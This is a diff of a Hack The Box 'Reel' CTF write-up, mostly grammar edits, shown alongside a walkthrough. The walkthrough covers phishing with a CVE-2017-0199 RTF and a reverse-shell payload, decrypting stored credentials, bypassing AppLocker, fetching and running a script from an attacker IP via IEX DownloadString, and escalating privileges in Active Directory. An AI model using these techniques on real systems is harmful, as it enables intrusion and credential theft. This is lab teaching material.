@@ -131,7 +131,7 @@ please email me any rtf format procedures - I'll review and convert.
 new format / converted documents will be saved here.
 ```
 
-Hmmm. Converting RTFs to what? DOCX maybe? Since the other documents in the directory are Microsoft Word documents, that seems a reasonable guess to make. Now, I wasn't able to read `Windows Event Forwarding.docx`, my LibreOffice spits out an error everytime I try, but I have more luck with `AppLocker.docx`. It says:
+Hmmm. Converting RTFs to what? DOCX maybe? Since the other documents in the directory are Microsoft Word documents, that seems a reasonable guess to make. Now, I am unable to read `Windows Event Forwarding.docx`, my LibreOffice spits out an error everytime I try, but I have more luck with `AppLocker.docx`. It says:
 
 ```
 AppLocker procedure to be documented - hash rules for exe, msi and scripts (ps1,vbs,cmd,bat,js) are in effect.
@@ -143,7 +143,7 @@ Ok, bad news. This probably means we will have to face `AppLocker` once we get a
 
 We have a good amount of information from our enumeration phase. Now it's time to craft a meticulously planned several-stage attack... or to bang our heads against the machine until something works. Yay, *hacking*!
 
-We know from our `nmap` scan that the server has an SMTP service listening at port 25, which kind of sticks out now because of the `readme.txt` we previously read. So we *maybe* are capable to use this SMTP server to send e-mails, but to whom?
+We know from our `nmap` scan that the server has an SMTP service listening at port 25, which kind of sticks out now because of the `readme.txt` we previously read. So *maybe* we are capable of using this SMTP server to send e-mails, but to whom?
 
 Well, whoever wrote/converted the documents in the FTP server, she's probably a user of the machine and therefore a potential victim. So is there a chance her user account is somewhere in the generated documents?
 
@@ -152,7 +152,7 @@ Now, I have a confession to make. I don't usually add it to my writeups unless i
 So you can imagine I got really happy when I ran `exiftool` on the three documents and one of them was bingo:
 
 ```
- exiftool Windows\ Event\ Forwarding.docx
+# exiftool Windows\ Event\ Forwarding.docx
 ExifTool Version Number         : 11.16
 File Name                       : Windows Event Forwarding.docx
 Directory                       : .
@@ -208,7 +208,7 @@ Yeah, seems easy right? (*Narrator*: it was not)
 
 ## Malicious documents
 
-The first thing we should do is searching for a suitable (and somewhat recent) exploit that could affect nico when he opens our RTF document. Our best friend `searchsploit` to the rescue!
+The first thing we should do is searching for a suitable (and somewhat recent) exploit that could affect `nico` when he opens our RTF document. Our best friend `searchsploit` to the rescue!
 
 ```
 # searchsploit microsoft word rtf
@@ -226,7 +226,7 @@ Microsoft Word 2007 - RTF Object Confusion (ASLR + DEP Bypass)                  
 Shellcodes: No Result
 ```
 
-Okay, good enough. Most of these seem pretty old (MS10-087, MS14-017, Microsoft Word 2007...), but the first one sounds better. And also it's available in Metasploit, which is great if you are a script kiddie like me! A quick inspection of the exploit file with `searchsploit -x 41934` reveals the CVE field (`2017-0199`), which apart from looking more recent is a fantastic field for searching in Metasploit. Let's give it a try:
+Okay, good enough. Most of these seem pretty old (MS10-087, MS14-017, Microsoft Word 2007...), but the first one sounds better. And also it's available in Metasploit, which is great if you are a script kiddie like me! A quick inspection of the exploit file with `searchsploit -x 41934` reveals the CVE field (`2017-0199`) which, apart from looking more recent, is a fantastic field for searching in Metasploit. Let's give it a try:
 
 ```
 # msfdb run
@@ -312,7 +312,7 @@ s.quit()
 print "Sent!"
 ```
 
-As you can see, what it does is simply crafting and e-mail with subject "Greetings", from "hey@megabank.com", to "nico@megabank.com", some stupid text and the malicious file attached to it (specified when calling the script), and then it connects to Reel and tries to use the SMTP server to send it. What do we have to loose?
+As you can see, what it does is simply crafting and e-mail with subject "Greetings", from "hey@megabank.com", to "nico@megabank.com", some stupid text and the malicious file attached to it (specified when calling the script), and then it connects to Reel and tries to use the SMTP server to send it. What do we have to lose?
 
 ```
 # cp /root/.msf4/local/msf.doc .
@@ -331,7 +331,7 @@ Nothing. Damn it!
 
 I have to admit I lost *a lot* of time here. I thought that maybe the Word version used by nico wasn't vulnerable to this exploit. I considered trying to exploit one of the other services of the box. I tried to send the document manually connecting to the SMTP to no avail. I tried to rename the document to `msf.rtf` just in case nico only opened files with the RTF extension. Nothing. I was lost in the darkness.
 
-But then I realized a little something. I stopped the web server used by Metasploit, copied the malicious document to another directory and listened there on the same port with `SimpleHTTPServer`. And after sending the e-mail again, I saw the HTA document was actually being requested! So, the problem was the HTA file itself, i.e. the payload... The payload I used when generating the document was `windows/x64/shell/reverse_tcp`. For some reason (probably other failures in previous boxes) I assumed the machine was 64 bits. But that's a big assumption to make, specially with 0 data supporting it. I changed the payload to `windows/shell/reverse_tcp`, repeated the process, closed my eyes and wait.
+But then I realized a little something. I stopped the web server used by Metasploit, copied the malicious document to another directory and listened there on the same port with `SimpleHTTPServer`. And after sending the e-mail again, I saw the HTA document was actually being requested! So, the problem was the HTA file itself, i.e. the payload... The payload I used when generating the document was `windows/x64/shell/reverse_tcp`. For some reason (probably other failures in previous boxes) I assumed the machine was 64 bit. But that's a big assumption to make, specially with 0 data supporting it. I changed the payload to `windows/shell/reverse_tcp`, repeated the process, closed my eyes and waited.
 
 
 ```
@@ -359,7 +359,7 @@ Suddenly, everything in life was perfect.
 
 We finally have a shell on this box. It's going to be easy from here, right? Of course, that malicious document thing is the peak of difficulty of this machine, is it not? (*Narrator*: again, it was not)
 
-Normally, my first serious move when landing on a Windows machine is running `PowerUp.ps1`, analyze the results and work from there. But before that I like to peek around, at least the home directory of the user I've accessed with. So, to `C:\Users\nico\` we go! 
+Normally, my first serious move when landing on a Windows machine is running `PowerUp.ps1`, analyze the results and work from there. But, before that, I like to peek around, at least the home directory of the user I've accessed with. So, to `C:\Users\nico\` we go!
 
 In his `Desktop`, aside from the `user.txt` flag (yay!), there's an interesting file called `cred.xml`:
 
@@ -379,7 +379,7 @@ In his `Desktop`, aside from the `user.txt` flag (yay!), there's an interesting 
 </Objs>
 ```
 
-Hey, I know the type `PSCredential`! As the name of the file suggests, this probably contains credentials, and judging by its contents, they belong to the user `tom`. That's great! It is only a matter of researching what type of file is this and how to obtain the plain-text password from it. After googling a little, [two][1] StackOverflow [answers][2] help me understand that this file is the XML representation of a serialized Powershell object, more specifically a `PSCredential` one. And that the Powershell command `Import-Clixml` can help us undoing the process:
+Hey, I know the type `PSCredential`! As the name of the file suggests, it probably contains credentials, and judging by its contents, they belong to the user `tom`. That's great! It's only a matter of researching what type of file is this and how to obtain the plain-text password from it. After googling a little, [two][1] StackOverflow [answers][2] help me understand that this file is the XML representation of a serialized Powershell object, more specifically a `PSCredential` one. And that the Powershell command `Import-Clixml` can help us undoing the process:
 
 ```
 > powershell (Import-Clixml cred.xml).GetNetworkCredential().Password
@@ -390,12 +390,12 @@ Alright, this is going well!
 
 ## Tom
 
-Luckily for us, SSH is listening on this box, so we don't have to rely on the shell obtained through the Word exploit. Let's just login as Tom like a completely legitimate user.
+Luckily for us, SSH is listening on this box, so we don't have to rely on the shell obtained through the Word exploit. Let's just log in as Tom like a completely legitimate user.
 
 Again, peeking on Tom's Desktop reveals another interesting folder: `AD Audit`. 
 
 ```
-tom@REEL C:\Users\tom\Desktop\AD Audit>dir
+> dir
   Volume in drive C has no label
   Volume Serial number is CC8A-33E1
 
@@ -412,7 +412,7 @@ tom@REEL C:\Users\tom\Desktop\AD Audit>dir
 BloodHound! This is going to be interesting... But let's read `note.txt` first:
 
 ```
-tom@REEL C:\Users\tom\Desktop\AD Audit>type note.txt
+> type note.txt
 Findings:
 
 Surprisingly, no AD attack paths from user to Domain Admin (using default shortest path query).
@@ -422,7 +422,7 @@ Maybe we should re-run Cypher query against other groups we've created.
 
 OK, big hint here. BloodHound out-of-the-box didn't find a way to escalate from user to DA, so probably we have to use it in a not-so-default way to find something juicy. At this point, I had to research (a.k.a. googling) again because, even though I knew the tool, I had never used it.
 
-In short, BloodHound is a *fantastic* tool that helps analyzing an AD environment in order to find ways low-privileged users could escalate to Domain Admins, moving through other users and groups until reaching their traget. It's not only that BloodHound comes with *a lot* of scripts that help with the task of obtaining this information (called *Ingestors*), but it also has a beautiful GUI which presents it in a graph format, showing relations between entities (mainly AD users and groups) and allowing you to query this graph and find whatever you need. For more information you can refer to [BloodHound's wiki in GitHub][3] and the wonderful DEF CON presentation [Six Degrees of Domain Admin][4].
+In short, BloodHound is a *fantastic* tool that helps analyzing an AD environment in order to find ways low-privileged users could escalate to Domain Admins, moving through other users and groups until reaching their traget. It's not only that BloodHound comes with *a lot* of scripts that help with the task of obtaining this information (called *Ingestors*), but it also has a beautiful GUI which presents it in a graph format, showing relations between entities (mainly AD users and groups) and allowing you to query this graph and find whatever you need. For more information you can refer to [BloodHound's wiki on GitHub][3] and the wonderful DEF CON presentation [Six Degrees of Domain Admin][4].
 
 At this point, it's more or less clear what we need to do:
 
@@ -448,7 +448,7 @@ At line:1 char:1
     + FullyQualifiedErrorId : UnauthorizedAccess
 ```
 
-Oops! Remember the AppLocker document we found during our enumeration phase? `.ps1` files are restricted by AppLocker, so we won't be able to run scripts this way. But we know interactive Powershell actually works, since we used it in our initial exploit and right now in our shell. This means we can easily byppas AppLocker by simply using `IEX` and `Get-Content` like this:
+Oops! Remember the AppLocker document we found during our enumeration phase? `.ps1` files are restricted by AppLocker, so we won't be able to run scripts this way. But we know interactive Powershell actually works, since we used it in our initial exploit and right now in our shell. This means we can easily bypass AppLocker by simply using `IEX` and `Get-Content` like this:
 
 ```
 > Get-Content SharpHound.ps1 -raw | IEX
@@ -456,9 +456,9 @@ Oops! Remember the AppLocker document we found during our enumeration phase? `.p
 
 ### About versions, CSVs and JSONs
 
-Now, I'll save you some time and tell you a little spoiler. The version of BloodHound installed on Reel is an old one (`1.5.2`), which used CSV as the format for the collected data. If you happened to install the most recent BloodHound on your Kali, this data won't be accepted by it, since BloodHound 2 onwards expects data in JSON format. So you have two options: either you install BloodHound 1.5.2 on your Kali, or you load into Reel BloodHound's most recent Ingestor. I tried both ways, and I think the second one is easier. So let's do that.
+Now, I'll save you some time and tell you a little spoiler. The version of BloodHound installed on Reel is an old one (`1.5.2`), which used CSV as the format for the collected data. If you happened to install the most recent BloodHound on your attacker box, this data won't be accepted by it, since BloodHound 2 onwards expects data in JSON format. So you have two options: either you install BloodHound 1.5.2 on your box, or you load BloodHound's most recent Ingestor into Reel. I tried both ways, and I think the second one is easier. So let's do that.
 
-After cloning latest BloodHound version from GitHub on our attacker box, we can just use python's `SimpleHTTPServer` to serve `Ingestors/SharpHound.ps1` and get it from Reel:
+After cloning the latest BloodHound version from GitHub on our attacker box, we can just use python's `SimpleHTTPServer` to serve `Ingestors/SharpHound.ps1` and get it from Reel:
 
 ```
 > IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.12.157/SharpHound.ps1')
@@ -471,7 +471,7 @@ And now we can run the `Invoke-BloodHound` function to gather the needed data, b
 > Invoke-BloodHound -CollectionMethod All
 ```
 
-Let's go big and say `-CollectionMethod All` since the `note.txt` file mentioned the default query didn't find anything, so we'll need all the data we are able to gather. After some time, the command ends and we see several files were created: `.json` files, a `.bin` file and a `.zip` file. What BloodHound needs is the ZIP file (which contains all the generated JSONs), so let's obtain it with SCP since we have SSH available :)
+Let's go big and use `-CollectionMethod All` since the `note.txt` file mentioned the default query didn't find anything, so we'll need all the data we are able to gather. After some time, the command ends and we see several files were created: `.json` files, a `.bin` file and a `.zip` file. What BloodHound needs is the ZIP file (which contains all the generated JSONs), so let's obtain it with SCP since we have SSH available :)
 
 ```
 # scp tom@10.10.10.77:'"C:\Windows\TEMP\20181107184135_BloodHound.zip"' .
@@ -490,7 +490,7 @@ Great! Time to launch BloodHound! It needs `neo4j` to be running, so let's get t
 # bloodhound
 ```
 
-After being shown the cool BloodHound logo, we can use the `Upload Data` button on right panel and select the ZIP file to load Reel's data into BloodHound. Some seconds after, we can see a graph containing the `DOMAIN ADMINS@HTB.LOCAL` group, with its three members, none of them accessible by us. Well, it seems the `note.txt` file was right and we'll need to dig deeper. Let's start by seeing which paths are accessible from our current user, `tom`.
+After being shown the cool BloodHound logo, we can use the `Upload Data` button on the right panel and select the ZIP file to load Reel's data into BloodHound. Some seconds later, we can see a graph containing the `DOMAIN ADMINS@HTB.LOCAL` group, with its three members, none of them accessible by us. Well, it seems the `note.txt` file was right and we'll need to dig deeper. Let's start by seeing which paths are accessible from our current user, `tom`.
 
 By writing `tom` in the upper search bar, BloodHound rapidly suggests the node `TOM@HTB.LOCAL`, which we can select. Then, by clicking on the graph node, all the collected info about Tom is shown to us. We are interested in the `Outbound Object Control` section, which shows which other AD objects `tom` has control over. We are shown the following graph:
 
@@ -611,9 +611,9 @@ Amazing!
 
 ## Claire
 
-Ok, we are near! We only need to do something similar for the `BACKUP_ADMINS` group see what being part of it means.
+Ok, we are near! We only need to do something similar for the `BACKUP_ADMINS` group and see what being part of it means.
 
-Oh, of course, since we changed users, we need to load `PowerView` again:
+Of course, since we changed users, we need to load `PowerView` again:
 
 ```
 > powershell
@@ -649,9 +649,9 @@ Set-ADAccountPassword -Reset -NewPassword $SecPasswd -Identity claire
 
 Another shameful confession. I wasted a lot of time at this point, and it was pretty frustrating. It required a lot of work reaching to this point, and it seemed it was for nothing. I couldn't access `Administrator` home directory, I couldn't read or write new files compared to "base" Claire, `BACKUP_ADMINS` didn't have any control over other AD objects according to BloodHound... So, was all this work for nothing?!
 
-...Turns out you have to log out and log in again for group changes to take effect. It's something obvious, it's something I knew from Linux (it works the same way), but my tired brain couldn't remember it and that meant a lot of frustation and wasted time wandering around. Lesson learned (even though I thought I already knew this): if you are tired, take a break! Even if you feel the victory so near you could touch it, working with a tired mind almost always doesn't pay off.
+...Turns out you have to log out and log in again for group changes to take effect. It's something obvious, it's something I knew from Linux (it works the same way there), but my tired brain couldn't remember it and that meant a lot of frustation and wasted time wandering around. Lesson learned (even though I thought I already knew this): if you are tired, take a break! Even if you feel the victory so near you could touch it, working with a tired mind almost always doesn't pay off.
 
-Ok, after this dramatic complication, we can continue! Log out, log in again, and the group change takes effect. Now, as Claire, we can access `C:\Users\Administrator`! Finally!! Let's read `root.txt` and claim our well deserved prize:
+Ok, after this dramatic complication, we can continue! Log out, log in again, and the group change takes effect. Now, as Claire, we can access `C:\Users\Administrator`. Finally!! Let's read `root.txt` and claim our well deserved prize:
 
 ```
 claire@REEL C:\Users\Administrator\Desktop>type root.txt
@@ -663,7 +663,8 @@ God dammit!
 It couldn't be that easy, right? It seems there are other things in `Administrator`'s Desktop. Let's see what this `Backup Scripts` folder is.
 
 ```
-claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir
+> cd "C:\Users\Administrator\Desktop\Backup Scripts"
+> dir
   Volume in drive C has no label
   Volume Serial number is CC8A-33E1
 
@@ -684,7 +685,7 @@ claire@REEL C:\Users\Administrator\Desktop\Backup Scripts>dir
 Alright, it's just digging work at this point. After reviewing these scripts one by one (which seem to be used to automate the backup process of some directories of the box), we finally find what we are looking for:
 
 ```
->type BackupScript.ps1
+> type BackupScript.ps1
 # admin password                                                                                                
 $password="Cr4ckMeIfYouC4n!" 
 [...]
